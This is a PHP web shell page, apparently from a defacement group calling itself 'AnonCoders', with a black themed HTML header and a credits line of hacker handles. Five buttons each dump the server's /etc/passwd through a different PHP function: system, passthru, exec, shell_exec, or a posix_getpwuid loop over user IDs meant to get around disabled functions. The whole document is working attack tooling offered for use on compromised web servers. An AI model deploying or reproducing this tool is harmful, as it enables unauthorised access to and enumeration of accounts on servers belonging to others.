<style type="text/css">
body {
background:
url("http://i.imgur.com/hg21xZ9.png") repeat , 
url("http://s1.postimg.org/rckfm3een/Screenshot_0.jpg") no-repeat center top,top left,top right;
background-color: #000000;
</style>
<font face='Orbitron'>



<center><font color="red" size="6" face="Arial Black">Bypass /etc/passwd By AnonCoders<center>
<div class="tul"><font color="red" face="Arial Black, Geneva, sans-serif" style="font-size: 6pt">


<p>

<center><font face='Arial Black' color='gold' size='4'>Bypass With System Function
<form method='post'>
<input type="submit" value='Bypass' name="syst">
</form>
</center>
</p>

<p>
<center>Bypass With Passthru Function
<form method='post'>
<font face='Arial Black' color='gold' size='4'>
<input type="submit" value='Bypass' name="passth">
</form>
</center>
</p>

<p>

<center><font face='Arial Black' color='gold' size='4'>Bypass With Exec Function
<form method='post'>
<input type="submit" value='Bypass' name="ex">
</form>
</center>
</p>

<p>

<center><font face='Arial Black'' color='gold' size='4'>Bypass With shell_exec Function
<form method='post'>
<input type="submit" value='Bypass' name="shex">
</form>
</center>
</p>

<p>

<center><font face='Arial Black'' color='gold' size='4'>Bypass With Posix_getpwuid Function
<form method='post'>
<input type="submit" value='Bypass' name="posix">
</form>
</center>
</p>



<center>
    
<?php
//System Function //
if ($_POST['syst']) {
    echo "<textarea cols='70' rows='30'>";
    echo system("cat /etc/passwd");
    echo "</textarea><br>";
    echo "
<br>
<b>

</b>
<br>
";
}
?>

</center>

<center>
    
<?php
//Passthru Function //
if ($_POST['passth']) {
    echo "<textarea cols='70' rows='30'>";
    echo passthru("cat /etc/passwd");
    echo "</textarea><br>";
    echo "
<br>
<b>

</b>
<br>
";
}
?>

</center>

<center>
    
<?php
//exec Function //
if ($_POST['ex']) {
    echo "<textarea cols='70' rows='30'>";
    echo exec("cat /etc/passwd");
    echo "</textarea><br>";
    echo "
<br>
<b>

</b>
<br>
";
}
?>

</center>

<center>
    
<?php
//exec Function //
if ($_POST['shex']) {
    echo "<textarea cols='70' rows='30'>";
    echo shell_exec("cat /etc/passwd");
    echo "</textarea><br>";
    echo "
<br>
<b>

</b>
<br>
";
}
?>

</center>

<center>
    
<?php
//posix_getpwuid Function //
if ($_POST['posix']) {
    echo "<textarea cols='70' rows='30'>";
    for ($uid = 0;$uid < 60000;$uid++) {
        $ara = posix_getpwuid($uid);
        if (!empty($ara)) {
            while (list($key, $val) = each($ara)) {
                print "$val:";
            }
            print "
";
        }
    }
    echo "</textarea><br>";
    echo "
<br>
<b>

</b>
<br>
";
}
echo '<font color="green" size="1pt"></font><br><font color="blue" size="3pt">We Are: Unknown Al / Black Worm / DarkShadow TN / Dr.T3rr0r / Gunz_Berry</font>';
?>

</center>
